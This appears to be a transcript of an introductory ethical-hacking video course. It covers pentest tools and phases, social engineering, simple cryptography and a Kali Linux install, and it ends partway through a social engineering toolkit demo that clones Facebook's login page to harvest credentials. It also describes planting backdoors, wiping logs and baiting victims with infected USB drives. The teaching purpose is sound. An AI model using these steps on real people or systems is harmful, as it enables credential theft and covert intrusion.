with the intent of doing harm to an
organization's Network for personal gain
we have discussed what the ethical
hacker is so an ethical hacker would be
doing the same activity but in an
authorized manner so they would have
legal contracts that they would be
signing with the organization it would
give them a definite scope of what they
are allowed to do and what they are not
allowed to do and the ethical hackers
would function within those Scopes would
try to execute those 10 scenarios where
they would be able to identify those
flaws or those system vulnerabilities
and then they would be submitting a
report to the management of what they
have found they would also help the
management to mitigate or to resolve
those weaknesses so that nobody else can
misuse them later on they might use the
same techniques and the same tools that
black hat hackers do however the main
difference here is that these guys are
authorized to do that particular
activity they're doing it in a
controlled manner with the intent of
helping the organization and not with
the intent of personal gains so who's an
ethical hacker again an ethical hacker
is a highly intelligent Highly Educated
person who knows how computers function
how programming languages work how
operating systems work they can
troubleshoot they're technically very
Adept at Computing they understand the
architecture they understand how various
components in a computer work they can
troubleshoot those components and they
can basically be very good with
programming as well now when I say
programming we don't want the ethical
hacker to be a good developer of
applications we want them to understand
programming in such a way that they can
create scripts they can write their own
short programs like viruses worms
Trojans or exploits which will help them
achieve the objective that they have set
out for so uh here you can see uh the
ethical hacker there are individuals who
perform a security assessment of the
companies with the permission of
concerned authorities so what is a
security assessment a security
assessment is finding out the exact
security posture of the organization by
identifying what security controls are
in place how they've been configured and
if there are any gaps in the
configurations themselves so an
organization will hire a ethical hacker
they would give the ethical hacker the
information about what information is or
what security controls what firewalls
the what idss ipss intrusion detection
or intrusion prevention systems
anti-virus is already in place and then
they will ask the ethical hacker to
figure out a way to bypass these
mechanisms and see if they can still
hack the organization what is the need
of an ethical hacker the need of an
ethical hacker is proactive security the
ethical hacker would identify all the
existing flaws in an organization and
try to resolve those laws to help secure
the organization from black hat hackers
so ethical hackers would prevent Hackers
from cracking into an organization's
Network by securing the organization by
improving on their security on a
periodic basis and they would also try
to identify system vulnerabilities
Network vulnerabilities or application
Level vulnerabilities that would have
been missed or have already been missed
and then tried to figure out a way of
plugging them or resolving them so that
they cannot be misused by other hackers
they would also analyze and enhance an
organization's security policies now
what are policies policies are basically
documents that have been created by an
organization of rules that all the
employees need to follow to ensure that
the security of an organization is
maintained for example a password policy
a password policy would help users in an
organization to adhere to the standards
the organization has identified for a
password complexity for example a
password when a user is creating them
should adhere to standards where they
are using random words they are they
contain the alphabet A through Z
uppercase and low case 0 through 9 as
numerics and special characters and
they're randomized so that the password
becomes more stronger to prevent from
Brute Force attacks so what would an
ethical hacker do at this point in time
they would try to test the strength of
the passwords to see if Brute Force
attacks or dictionary attacks are
possible and if any of these passwords
can be cracked they would ensure that
all the employees are following the
policies and all the passwords are as
secured as the policies want them to be
if there are any gaps in the policies or
the implementation of the policy it is
the ethical Hacker's responsibility to
identify those gaps and want the
organization about it similarly they
would also try to protect any personal
information any data that is owned by
the organization that is critical for
the functioning of the organization and
they will try to protect it by from
falling into the Hacker's hands now what
are the skills that are required of an
ethical hacker these are the following
skills so first and foremost they should
have good knowledge with operating
systems such as Windows Linux Unix and
Mac now when we say knowledge about
operating systems it's not only about
how to use those operating systems but
how to troubleshoot those operating
systems how these operating systems work
how these operating systems need to be
configured how can they be secured for
example securing an operating system is
not only installing a firewall and an
antivirus but you need to configure
permissions on an operating system of
what users are allowed to do and what
users are not allowed to do for example
limiting the installation of
applications how are we going to do that
we need to go into the system center the
security Center of Windows and we need
to configure security parameters over
there of what are acceptable softwares
and what are not same with Linux and Mac
softwares operating systems so we need
to know how we can secure these
operating systems similarly all of these
would have desktop versions and server
versions of operating systems as an
ethical hacker we need to know the
desktop and server versions both how to
configure them and how to provide
services within the organization on
these servers so that they can be
consumed in a secure manner by all the
employees at the same time there should
also be knowledgeable of programming
languages or scripting languages such as
PHP python Ruby HTML for programming if
you will because web servers come into
the picture so again they should not be
great developers where they can create
huge applications but they should be
able to develop scripts understand those
scripts analyze those scripts and figure
out what the output should be of those
scripts to achieve the hacking goals
that they have set out for and ethical
hackers should have a very good
understanding about networking no matter
whether you're an application security
you're in network security or you're in
host based security since a computer
will always be connected to a network
either a local area network like a lan
or the internet we should know how
networking works we should know the
seven layers of the OSI model we should
know protocols work on those seven
layers we should identify the TCP model
and how OSI model can be mapped to the
TCP model we should understand how TCP
and UDP work how how each and every
protocol is crafted how they are
supposed to behave for us to analyze and
understand any network-based attacks we
should be very good in security measures
so we should know where those
vulnerabilities would lie what are the
latest exploits available in the market
and we should be able to identify them
we should be able to know the techniques
and the tools of how to deal with
security how to analyze security and
then how to implement security to
enhance it as well along with that it is
important that a security analyst or
ethical hacker is aware of the local
security laws and standards why is that
because an organization cannot do any
illegal activity whatever responses that
they have whatever security mechanisms
whatever security controls they will
Implement they need to be adhering to
the local law of the land they should be
legal in nature and should not cause
undue harm to any of the employees or
any of the third party clients that they
are dealing with so the ethical hacker
should be aware of what security laws
are before they Implement security
controls or even before they start
testing for security controls and all of
these should be backed up by having a
global certification or a globally valid
certification related to networking
related to security ethical hacking the
law of the land anything and everything
maybe even programming it's good to have
a certification in PHP pull python Ruby
and so on so forth why because most of
the organizations when they hire ethical
hackers look out for these
certifications especially globally valid
certifications so that they can be sure
or they can be assured that the person
that they are hiring has the required
skill set so let's talk about a few of
the tools that a ethical hacker would
utilize in the testing scenarios to be
honest there are hundreds of tools out
there what you see on the screen as just
a few examples of them uh nessus is a
vulnerability scanner what is a
vulnerability scanner it is an automated
tool that is designed to identify
vulnerabilities within hosts within
operating systems within networks so
they come with their ready-made
databases of all the vulnerabilities
that have already been identified and
the scan the network against that
database to find out any possible flaws
or any possible vulnerabilities that
currently exist on the host or the
operating system or on the network
similarly there would be application
scanners like acunetics or Arachne that
would help you scan applications and
identify flaws within those applications
as well now all of these are automated
tools the essence of ethical hacker is
when these tools churn out the reports
the ethical hacker can understand these
reports analyze them identify the flaws
and then craft their own exploits or use
existing exploits in a particular manner
so that they can get access or they can
bypass the access or security controls
mechanisms that are already in place how
can they do that with the tool called
Metasploit you see that big M there on
the right hand side that M logo is for a
tool called Metasploit which is a
penetration testing tool what is a
penetration testing tool it is that tool
that will allow a ethical hacker to
craft their exploits or choose their
exploits for the vulnerabilities that
have been identified by Nexus since we
are interacting with computers we will
always be interacting using tools right
so the first tool nessus identifies the
flaws and the possible list of
vulnerabilities we do a penetration test
using Metasploit to validate those flaws
and to verify that those projects
actually exist and try to figure out the
complexity of those flaws and that's
where Metasploit helps us do that
Wireshark could be used in the
background while we are doing both the
activities using nessus or Metasploit to
keep a track of what packets are being
sent and by received on the network
which will help us analyze those packets
so whenever I run a necess scanner I
would run a Wireshark in the background
it will capture the data packets and I
can go through those data packets and
analyze that data package to identify
what is actually trying to do similarly
when I try to attack a machine using
exploit on Metasploit I will keep on
Wireshark running in the background to
capture the data package that have been
sent and the responses that I've
received from the victim so that I can
also go through those packets and
analyze the responses and analyze the
attack whether it was successful to what
extent was it successful and basically
it will also give me a validation of
proof of the activity that has happened
nmap is another automated tool that
allows me to scan for open ports and
protocols so why would I use nmap
because Pro ports and protocols become
an entry point for a hacker to gain
access to devices for example when we
connect to a web server we connect to a
web browser but we automatically connect
to Port 80 using HTTP and Port 443 is
using https so if I'm connecting to a
web server using https it is safe to
assume that Port 443 on the web server
is open to accept those connections
similarly there will be other services
that may be left open on the web server
because nobody thought about configuring
it or they misconfigured the web server
and they left unwanted Services running
so nmap will allow me to scan those
ports and services and allow me to
understand what services are being
offered on that server so then I can
start analyzing that server identify
those flaws within those services and
then try to attack them if the
application that I'm analyzing is
connected to a database and I want to do
a SQL injection attack or if I if nessus
tells me that there is a SQL injection
attack that may be possible on that
particular application I can use an
automated tool called SQL map or SQL map
that would allow me to automatically
craft all the queries that are required
for a SQL injection attack and help me
do that attack at the same time so here
I do not have to manually create my own
queries uh the SQL map tool would
automatically create them for me what I
would do is I would use Nexus to
identify that particular flaw if nessus
reports that flaw I would then go use
the tool SQL map configure it to attack
that particular web server and when I
fire off the tool it will then
automatically start directing queries
SQL injection queries to the database to
see if those databases are vulnerable
and if yes what data can be retrieved
from those databases so all of these
tools in a nutshell would help me hack
networks applications operating systems
and host devices and this is what
ethical hacker does they use these kind
of tool sets they identify what attacks
they need to do they identify the right
tool for that particular attack and they
write their exploits they create those
attacks and then they start attacking
analyze the response and then give a
report to the management providing them
feedback about how the attack was
created or crafted what was the response
to that attack and whether the attack
was successful or not if successful they
would also give recommendations of what
to do to prevent these attacks from
happening in the future so when we are
doing these attacks or when we want to
Launch these attacks what is the process
that we would follow so there are six
steps that we would do as an ethical
hacker if you are just a hacker you
probably wouldn't do the sixth step
which is a reporting step so the first
step that would be done is the
reconnaissance phase which is the
information gathering phase which is
very important from ethical hackers
perspective or a hacker's perspective
because if I want to attack someone or
something as a digital device I need to
know what I'm attacking I need to know
the IP address of the device the MAC
address of those devices I need to know
the operating system the build or the
version of that operating systems
applications on top the versions of
those applications so I know what I'm
attacking for example if I if I want to
attack a server I assume it's a Windows
based server and I use a particular tool
to attack it but it actually turns out
to be a Linux based server my attacks
are going to be unsuccessful so I need
to focus my attack based on what is
there at the other end so in my
information gathering phase I want to
identify all of that information once I
have that information done I'm going to
scan those servers using tools like nmap
that we just talked about and we are
going to try to see the open ports open
services and protocols that are running
on that server that can give me possible
entry points within the network or
within the device or within the
operating system at the same time along
with the scanning with nmap I would run
a vulnerability scanner the nasus
vulnerabilities scanner we talked about
or acunetics for applications and then I
would try to identify vulnerabilities in
those applications operating systems or
networks once I have identified those
vulnerabilities in the scanning phase I
would then move on to the gaining phase
where I would then craft my exploits or
choose existing exploits and start
attacking the attacking the victim at
this point in time if my attack is
successful I will probably have gained
access by either tracking passwords or
escalating privileges or exploiting a
vulnerability that I may have found
during the scanning phase once I have
gained my access I want to maintain my
access why because the vulnerability may
not be there for long maybe somebody
updated the operating system and hence
the flaw was no longer exist existing or
somebody changed the password that we
have I may have cracked thus I no longer
have access so what do I do to maintain
my access I installed Trojans or back
door entries to those systems using
which I can secretly in a covert manner
get access to those devices at my own
will at my own time as long as those
devices are available over the network
so that's where I maintain my access I
have hacked them now I want to maintain
my access so I install a software which
would give me a backdoor entry to that
device no matter what once I have done
this I want to clear my track so
whatever activity that I've been doing
for example installing a Trojan a Trojan
is also a software that would create
directory directories and files once
installed on the victims machine so I
want to hide that if I have access data
stores if I have modified data I want to
hide that activity because if the victim
comes to know that something has
happened they would start they would
start increasing their security
parameters they might start scanning
their devices they will take them
offline does my hack would no longer be
efficient the reason I'm clearing my
tracks is that the victim doesn't find
out that they have been hacked or they
have been compromised or even if they do
find out that they've been compromised
they cannot trace the compromise back to
me so I would be deleting references of
any of the IP addresses or Mac addresses
that I may have used to attack that
particular device and this is where I
will be able to identify where those
logs were created where those traces are
once I take off those traces the victim
would not be any wiser of whether they
have been compromised or who compromised
their system and if I am successful at
all of these stages or what to whatever
extent the success that I've achieved in
any of these stages I would then create
a report based on that and I would
report to the management about the
activities that we have been able to do
and whatever we have been able to
achieve out of those activities for
example we identified 10 different flaws
there were 20 different attacks that we
wanted to do what attack did we do what
was the outcome of that attack what was
the intended or the expected output of
that attack I'll create a report which
would give a detailed analysis of all
the steps that were taken along with
screenshots and evidences of what
activity was conducted what was the
output what was the expected output and
I would submit that report to the
management giving them an idea of what
vulnerabilities and flaws exist in their
environment or their devices that need
to be mitigated so that the security can
be enhanced so these are the six steps
that ethical hacking process would take
uh just going through this
recognitions is where you're going to
use hiking tools like nmap HP to obtain
information about targets there are
hundreds of tools out there depending on
what information you want then in
scanning again nmap next pose these kind
of tools to be utilized to identify open
ports protocols and services in gaining
access you're going to exploit the
vulnerability by using the Metasploit
tool that we talked about in the
previous slides in the maintaining
access you're going to install backdoors
you can use meta square at the same time
you can craft your own scripts to create
a Trojan and install it on the victim's
machine once you have achieved that
clearing tracks is where you're going to
clear all evidences of your activity so
that you do not get caught or the victim
doesn't even realize that they have been
hacked and once you have done all of
this we are going to create reports that
are going to be submitted to the
management to help them understand the
current security evaluation of their
organization so now let's see how we can
hack using social engineering now what
is social engineering social engineering
is the art of manipulating humans into
revealing confidential information which
they otherwise would not have revealed
so this is where your social skill and
your people's skills come into the
picture if you are able to communicate
effectively to another person they would
probably give up more information that
they intended to give out let's take a
look at examples right if you see on the
screen phishing activity what is
phishing we receive a lot of fake wins
on a regular basis we have always
received those emails where we have won
a lottery of a few million dollars but
we have never realized that we didn't
purchase a lottery to win lottery in the
first place we have always had those
Nigerian frauds where a prince died in
some South African country and you out
of 7 billion people on the planet have
been identified where they want to
transfer a few hundred million dollars
through your account and they want to
give you 50 of that money in return as
thank you so some very basic attacks
where you go on to websites and there's
a banner flashing at you saying
congratulations you're the one millionth
visitor to this website click here to
claim your price all of these are social
engineering attacks phishing attacks
fake websites fake Communications being
sent out to users to prey on their
gullibility most of humans always have
that dream of striking it rich winning a
huge Lottery once and for all and living
their life lavishly ever after but sadly
in the real world that's not that
doesn't happen that often and if you're
receiving those meals it is very
important that you first research the
validity of those those Communications
before you even want to act upon them so
why are humans susceptible to socially
engineering because humans have emotions
machines do not try pleading with the
machine to give you access to a account
that you have forgotten a password to
the machine wouldn't even know what
you're doing try pleading with a human
sympathy or empathy where you could try
to create a social engineering attack
where you can plead with them saying if
I do not get access to this account
immediately I might lose my job and then
that would put my family into problems
somebody would feel empathy or sympathy
towards you and help you reset that
password and give you access to that
account it's how good the attack is and
how convincing you are for the success
of this attack to happen so what is a
familiarity exploit attackers interact
with victims to gain information which
will benefit the attackers to crack
credentials as passwords if we want to
reset our passwords what do we have as a
mechanism to resetting passwords we have
some security questions that we set up
those questions are nothing but personal
information that we would know but
through a social engineering attack it
would be easily be able to uh gather the
information that you have set for your
security questions the security
questions can be as simple as the first
cool that you attended you probably have
that listed on your LinkedIn profile
where a person can just go in there and
see your academic qualifications and
identify the school that you're in right
similarly it might also be a question
what was your mother's maiden name
that's a very good attack and that's uh
I mean if a person can interact with you
let's say they are trying to take a
survey and approach you for a feedback
on a particular product that you have
been utilizing and they ask you these
questions you wouldn't think twice
before giving those answers as long as
the request sounds legitimate to us we
are able to justify that request we do
answer those queries so it's upon us to
verify the authenticity of the request
coming in before we answer it phishing
as discussed would be fraudulent emails
which appear to be coming from a trusted
source so email spoofing comes into mind
uh fake websites and so on so forth
exploiting human curiosity curiosity
killed the cat right so there was
there's so many physical attacks where
hackers just keep pen drives lying
around in a parking lot now this is open
a generic attack whoever Falls victim
will fall victim so if I just throw
around a few USBS in the parking lot
obviously with Trojans implemented on
them some people who are curious or who
are looking for a couple of freebies
might take up those pen drives plug them
in their computers to see what data is
on the pen drives at the same time once
they plug in there those pendrives on
their computers the virus or the Trojan
would get infected and cause harm to
their machine then exploiting human
greed we just talked about the Nigerian
frauds and the lotteries those kind of
attacks the fake money making gimmicks
now basically this is where you Prey
Upon the person's greed kicking in and
they are clicking on those links in
order to get that money that has been
promised to them in that email so one of
the safest mechanism to keep data
private and to keep yourself secure is
using encryption now encryption can
happen through cryptography what is
cryptography cryptography is the part of
scrambling data using a particular
algorithm so that the data becomes
unreadable to the normal user the only
person with the key to unscramble that
data would be able to unscramble it and
make sense out of that data so we're
just making it unreadable or
non-readable by using a particular key
or a particular algorithm and then we
are going to send the key to the end
user the you end user using this same
key would then decrypt the data if
anybody compromises that data while it
is being sent over the network since it
is encrypted they would not be able to
read it so the encryption algorithm
would be something like this now if you
see uh the computer word once made into
unreadable format would look like eqor
xvgt for an end user it wouldn't make
any sense but the person who has a key
to unscramble that would be able to
convert it back to computer and then
understand the meaning of that word so
this is just a substitution Cipher that
is being shown on the screen so what is
the alphabet the key is alphabet plus
three so C plus three alphabets that
becomes e o becomes q m becomes o so the
key that is utilized to scramble the
data is the character that you are at
the third character from there would be
the corresponding key so the encrypted
message is also known as a cipher the
decryption is just the other way around
where you know the key now and you can
now figure out what that e corresponding
to by going back three characters in the
alphabet most of the times a certified
ethical hacker must decrypt a message
without knowing the secret key so let's
say a ransomware has affected your
organization or has affected a device
and you want to figure out uh or you
want to decrypt that data now as ethical
hacker you wouldn't be for paying a
ransom to the hacker would you so it is
now your prerogative of how you're going
to work around and how you're going to
try to crack the encryption mechanism
how to crack the cipher to decrypt that
message and see what's within it right
decryption without the use of a secret
key that is known as a analysis Crypt
analysis is the reversing of an
algorithm to figure out what the
decryption was without using a key so
Crypt analysis can be done using various
formats the first one is a Brute Force
attack second is a dictionary attack the
third one is a rainbow table attack a
Brute Force attack is trying every
combination permutation and combination
of the key to figure out what the key
was it is 100 successful but may take a
lot of time a dictionary attack is where
you have created a list of possible
encryption mechanisms a list of possible
cracks and then you try to figure out
whether those cracks work or not rainbow
tables are where you have an encrypted
text in hand and you're trying to figure
out the similarities between between the
text that you have and the encrypted
data that you wanted to decrypt in the
first place so in the Brute Force attack
you're trying every possible combination
permutation of what the key would be in
dictionary attack you have a word list
that would tantamount to the key and if
you're you're trying to match all all
the words listed in the text file or the
word list to see if any of those words
are going to work to decrypt that data
here in the rainbow table the ciphertext
is compared with another Cipher text you
find out similarities and then you try
to work a reverse engineer your way
accordingly so let's have a quick demo
on cryptography before we end this
session so to begin with the demo of
cryptography we are on our website
called spammemic.com which will help us
scramble the message that we created
into a completely uh format which would
be unrelated to the topic at hand so if
I say I want to encode a message I turn
a short message into spam so what this
does is you want to send across a secret
message you type in The Secret Message a
short one and it will convert that into
a spam mail you send it across so
whoever is reading that spam mail would
never get an idea of the embedded
message within it so if I want to type
in a message here hi this is a secret
message the password is ASD at the rate
120 3 4 and I want to send this out to
people or to one of my colleagues but I
want to send it out in a secret manner
so that others are not aware of this so
when I press on encode what the
algorithm would do is it will convert
this message into a spam mail so my
message hi this is a secret message the
password is at the rate1234 or asg@1234
gets converted into this now if you read
it dear e-commerce professional this
letter was specially selected to be sent
to you this doesn't make sense there is
nowhere or no reference to the actual
message that I've already sent so if I
copy this entire message and I send it
let's say via email to the recipient now
the thing is that the recipient needs to
know that I have encoded it using spam
mimic the algorithm needs to remain the
same so once they know that it is Spam
mimic what they can do is now in this
instance what I'm going to do is I'm
going to open up a new browser and I'm
going to go to the same website and at
this point in time I am going to click
on decode when I click on decode I am
going to paste the message that I have
just copied there we are and this
message is now being copied into a
different browser and if I decode this
you will see that it will convert it
back to the original message that there
was so the key is there at spam mimic
and it is embedded within the message so
whenever we paste the message in the
decode Factor it knows what the key was
and it can decrypt that message and give
me the actual message that was embedded
within it there we are the entire
message this is what we created in the
Google Chrome browser and in the Firefox
browser we decoded similarly if I want
to protect these kind of messages there
is an aspirinencrypt.com website where
let's say we use text encryption and I
want to encrypt the same message this is
a secret message the password is ASD at
the rate1234 and then I give it a
password to protect this message let's
say the word password and I use the
cipher to scramble this by using let's
say AES which is the strongest Cipher
right now and I say encrypt so this is
what the encryption would look like and
basically if I don't have the password
over here if I decrypt it you would see
that there it has occurred if I type in
the password over here and then decrypt
it it will be able to convert that back
into the unscrambled text and it will
give me what the original message was
this is a secret message the password is
ASD at the rate one two three four so if
I want to keep my data secure from
hackers I want to scramble it in such a
way that they would not be able to crack
it or it would be very difficult from
for them to crack it and this is one of
the first mechanisms that would be
recommended by any ethical hacker to
keep the data secure now let's talk
about downloading and installing Kali
Linux along with that we'll also be
looking at the basic commands that are
required for Kali Linux all right so
I've opened my browser and we want to go
to the Kali website so we want to go to
kali.org you can directly type in
kali.org and go to the website I can
just do a Google Search and say Kali
download and it will give you the same
website but it will directly take you to
the downloads pages so either here and
or you can go to the home page cookies
are being installed on your machine so
see which cookies you want to allow I'm
only going to use the necessary cookies
to support this site and you can see
that this gives you the latest Kali
Linux news and tutorials gives you the
latest release what is in that release
and gives you a lot of documentation
which will help you understand what
tools to download but this is an ISO
image so we need to install it on a
virtual machine so what we need is we
need to use a hypervisor which will
allow us to create virtual machines so
we can either use VMware Workstation
which you can download from here however
this is paid version so you can see it
is around 250 or something for this
software but it is a very good software
to have so if you click on download now
it is going to start the download it's a
30-day trial period if you want to use
it after 30 days you'll need to enter
the key for which you will get after
purchasing the software if you do not
want to utilize this the free version
that you have you can either download
VMware Player but there are some
limitations for VMware Player that you
might want to look at does you want to
compare these products before you want
to purchase them right otherwise you can
download Oracle virtualbox which is a
free hypervisor it's not as robust as
VMware Workstation but it does the trick
right so the the free version 6.1 is
free and you can then create your own
virtual machines over there and install
operating systems on them what I do have
I already have a VMware Workstation
installed so I'm just going to open that
up and that's my VMware Workstation as
you can see I already have a lot of
virtual machines created over here what
we're going to do is we are going to
configure a virtual machine for the Kali
Linux operating system that we are
downloading which should be somewhere
here let's see it's at 43 percent so on
halfway there till then let's create the
virtual machine so I click click on file
create a new virtual machine I am going
to customize the machine so click on
next this will be default we don't want
to change that and then we want to
install the operating system later we
don't want to point it out right now so
I'll just click on I will install the
operating system later click on next we
want to install Linux now in the drop
down you would not see Kali Linux over
here however you can choose Ubuntu
64-bit that's what I'm going to choose
there it is next what is the name that
we want I want to give it Kali Linux
without the typo and I want to store it
in one of the folders that I created by
default it stores on the C drive which
is not a good place to store you don't
want to run out of space on your C drive
so I'm going to click on this PC and
this is my data and in here I'll have a
folder called virtualbox or virtual
machines there it is within which you
can see the other softwares that I
already created I'm going to create a
new folder and call it Kali 2019 l l for
is latest for me because you can see
already have a Kali Linux so I'm just
going to identify this folder with the L
at the end I'm going to select it and
click on okay you can see the path being
changed over here click on next it's
going to ask you how many processors now
depending on the processor that you have
you can see I've got a 8 core i7 so if I
give it 16 cores or 16 processors that's
not going to work I cannot go beyond
what the physicality already is so for
this machine One processor with one core
is more than enough if you're going to
use a lot of tools at the same time you
might just want to give it two cores so
we're giving it two cores it will ask us
for Ram to be provided for this Virtual
Machine by default 2048 megabytes that's
2GB of RAM is more than enough if you
require more we can change this later on
so click on next we want to use Nat for
now leave this default next whatever is
recommended keep it the way it is we do
not want to change it next create a new
virtual hard disk for this machine and
it is going to ask us the size 10 dgb is
more than fine store it as a single file
we don't want to use multiple filed
options click on next and then click on
browse wherever you want to store the
vmdk file or the virtual hard disk file
and we go back again to the same folder
that we had created virtual machines and
we look at the Kali Linux Kali 2019 L
and we want to store the vmdk file over
there once we save it we want to click
on next and then we want to click on
finish so this is the virtual machine
that has been created right here right
now this is the basic configuration now
where are we at with the operating
system and you can see the operating
system has been downloaded and it is
stored in this particular folder so we
go to e Drive so we're looking for the
sub the operating system that we have
downloaded we downloaded in the
operating systems folder and if we go in
here you can see the current one the
Kali Linux
2019.4 ISO right here so what we do we
go back to the Kali Linux machine that
we have created edit virtual machine
settings and we point this virtual
machine using the CD DVD and then we
point the iso the one that we downloaded
over here so we go back to e Drive we go
back to OS and we click on Kali Linux
2019 click on open so now when this
boots up it will boot up with this ISO
and then it will allow us to install the
operating system so click on OK then we
click on power on this virtual machine
it will start powering on it will boot
to the iso and it will start giving us
the booting options so I'm just going to
enter the full screen mode over here for
this to be better visible and we don't
want the live mode what we want is we
want to use the graphical install and
then we highlight that we press enter
and you can see the setup starting up
we'll wait for the GUI to pop up there
it is which language do we want for now
we want English click on continue where
are we located click on continue and the
configure your keyboard we want the US
keyboard American English continue it is
going to detect the hardware so as you
can see on the screen it's attempting a
auto configuration for most of these
settings the network with DHCP it has
identified the network cards Hardware
like the processor that has been
provided or is asking for a host name
we're going to leave it at default we're
going to click on continue domain name
I'm not joining this into a domain as
yet there's going to be a standalone
machine so I can leave this blank click
on continue now it is going to configure
the network it is asking for a password
at this point in time the root password
type in any password that you want
ensure that you remember the password
now by default the username for the
account is the name is the word root we
are just creating the password for the
root account and then we want to click
on continue setting of The Clock looking
at the hard disks now here it asks us do
we want to use the entire disk the 20 GB
virtual hardness that we had provided or
do we want to give it a manual
configuration or a guided one where we
want encryption and a logical volume
management coming into the picture we're
just going to use the first option
guided you use entire disk don't worry
it's only going to use the virtual disk
that you had created click on continue
it will give us that it's a 21.5 GB
VMware virtual disk that we had and
click on continue all files in one
partition that's what we want
recommended for new users whatever it is
we don't want to change these folders
continue and this is what we have
configured once we click on continue it
is going to say you are you sure you
want to make these changes click on yes
click on continue and it will start
installing Kali Linux on your device now
this is going to take a few minutes for
the installation to work all right so
that's the installation that's completed
now it's asking us to configure a
package manager a network mirror can be
used to supplement the software that is
included on the installation media this
may also make new versions of software
available you want to use a network
mirror we can click no for now and then
click on continue now this is going to
install the grub bootloader this might
take a few minutes as well install the
group grub loader to the master boot
record yes click on continue click the
hard disk that you just utilized this is
the one click on continue it will
install the grubboot loader running
through the last phases of the
installation and now it says the
installation is complete we want to
click click on continue finishing the
installation and then it will do a
reboot all right and here you can see
this is starting up so we are going to
you you just wait out the boot and now
it started the booting sequence it is
going to maximize the screen and you can
see it's asking me for the password this
is the one that we created now that's
the that's not the password that's the
username that's the root and the
password that we had created at that
point in time and then click on login
and this is your screen uh now what we
need to do here is we need to install
VMware tools which will help us manage
the screen and help the virtual machine
to be a little bit better integrated on
the system so that's not mounted yet so
we're just waiting for it to Mount there
it is and what we want to do here is
open VMware to the Creator all right so
what we want is we want to extract or we
want to use this openx archival and once
we do that we'll see the VMware
install.pl double click on that all
right we've got the VMware tools here
what I've done is we have extract two
and I've extracted that on the desktop
right so what we just did was click on
the desktop over here open and this is
what it will do and click on extract now
there is happening because I've already
extracted this open this up we want to
run this VMware install dot PL so what
do we do we open up the terminal window
which is the command line interface over
here and now this is where some of the
commands come into the picture so for
example PWD it will show us the present
working directory LS will show us the
list of the folders there there so the
folder that we have is on our desktop so
we'll just change directory to desktop
press enter do an LS that will show us
the list and you can see VMware tools
this trip that's the folder that we have
right here right so we want to go into
that folder CD VMware at this point you
can just click on Tab and it will
populate everything over there press
enter do an LS and we want the VMware
hyphen install dot PL to be executed all
right so we tried executing that command
we had an error over there so what we
need to do is we need to execute this
command so dot slash VMware in a hyphen
install.pl and we'll start creating now
it will ask you for your input
installing VMware Tools in which
directory do you want to install the
binary files uh by default it is going
to see you slash USR slash Win if I just
press enter it is going to use the
default as you can see the input over
here what directory do you want the any
directories I'm just going to press keep
on pressing enter for the defaults to
come in this part does not exist it is
going to create it default yes defaults
everywhere and then it tries to start
initializing it to maximize the screen
and this is where it is installing and
you can see by just installing that it
automatically adjusted the screen and
now we got a full screen of Kali Linux
right here right and that is what VMware
tools does for us once we have installed
the operating system and now you can see
the entire screen on here you will see
the tool sets that are given here now
why are we using Kali Linux in the first
place because this comes in uh with a
bundle of thousands of softwares that
are ready to be utilized for ethical
hacking right and they have been
categorized over here for information
gathering vulnerability analysis web
application analysis and so on so forth
so you can see for forensics onwards
reporting tools and as you scroll down
you can see your development tools
Graphics coming in Internet and the
system configuration coming into the
picture these are your settings for your
operating system so these are basically
your tools we are right now on the
favorites if I click on information
gathering you will see that other tools
for information gathering start
appearing over here for vulnerability
analysis we have got squatter and map
fuzzing tools web application analysis
we have got comics skip fish SQL map
database assessments password attacks
and so on so forth so if you just go in
the favorites this was the terminal
emulator that we utilized this is the
command line that we saw we use the CD
command we use the PWD command we did
the ls command as well to give us the
list of the directory that we are in
similarly there would be commands like
cat so let's go to CD downloads let's
see what the uh what's there you can see
this case sensitive so if I type in a
capital D and then do a tab LS there's
nothing over here on download so CD dot
dot will take us back One Directory now
you can see we are back from downloads
to root if I want to go to desktop this
is how I go to desktop do a LS you can
see the VMware tools uh folder over
there CD VMware tools and we go into
that folder LS which will give us the
list of all those files now you can see
install is a file that we add edit it
back then so if I do a cat install you
will see the cat basically is the
command that will help us look at the
contents of the file all right without
opening up the file or without editing
the file so you can see just if I scroll
up this is where we give the cat command
top do a CD dot dot now you can see we
are back in the root and now we are
going to do a CD downloads run LS and
you can see the copied file right here
so if I do a cat install you can see the
same content of that file coming in so
these are some of the commands that we
would need to learn as we go ahead the
remove command is let's say we've got
install we do a man RM man is the manual
page command that gives us the pages
with the description of how that
particular command is to be utilized so
RM is remove files or directories
synopsis is the description the options
hyphen f for Force hyphen I for prompt
hyphen capital I prompt ones before
removing more than three files and so on
so forth if you you want to exit this
you can press Q to exit and you come
back to this page so if I say RM install
LS you'll see that the install file has
now been deleted so in Windows we use
the Del Dell command in Linux it is the
RM command so this is what we wanted to
look at the demo for Kali Linux how to
download it how to install it and some
of the basic commands that we can
utilize all right let's begin with the
phishing tutorial we have the Kali Linux
operating system booted up over here
what we are going to do is we're going
to open up a tool called set social
engineering toolkit which you would find
in this option and that's the tool that
you want it's a command line tool a menu
driven tool we are going to host a fake
Facebook page and you can see how we can
Harvest credentials by this kind of an
attack so these are some disclaimers you
might want to go through that do you
want to agree to the terms of service
yes press enter and that's your social
engineering toolkit and we are are
talking about a phishing attack which
can comes under the social engineering
attack so it like I said it's a menu
driven tool so we just have to look at
these options and then just type in the
number of the option that we want so we
want to do a social engineering attack
so I type in one press enter and that it
is asking me whether I want a spear
phishing attack a website attack Vector
we are going to choose a second option
so I type in two press enter and then it
asks me uh what I want to do I want to
take the third option here credential
Harvester attack methodology and we want
to do the third attack now it is asking
whether we want to use the in-house
website templates that it already has or
do we want to clone a site or do we have
a customized site that we have prepared
that we want to migrate into this tool
we are going to do the site cloning
option so we're going to type in two
press enter and then it is going to ask
me the IP address where it wants to
capture the and store the credentials by
default this is the IP address that I'm
using so if I leave it blank it will
take my default IP address so I'm just
going to press enter and now it is
asking me the URL to clone so I type in
HTTPS
www.facebook.com what it is going to do
it is going to correct online and it is
now just let us clone the website uh
Facebook login.php the best way to use
this attack is that you if you use the
if the username and password form are in
the same field or the same page
regardless this captures all posts on a
website so you may need to copy www.star
into HTML depending on where your
directory structure is press return if
you understand what we are seeing here
so press enter the social engine toolkit
credential Harvest attack is running on
Port 80 information will be displayed to
you as it arrives so the site was 71.134
right the default IP address and this is
where the website is being hosted let's
check that out so let me open up a
browser on my host machine and let me
point it to the Kali Linux machine that
have just created 192 168
71.134 and you should see a login to
Facebook coming up right here looks
genuine it is genuine because we just
went online and downloaded this let's
just have a recap let's have an
explanation of what we are trying to do
I am trying to host fake Facebook page
on my server which has an embedded
script in it which is going to do
credential harvesting so the attack here
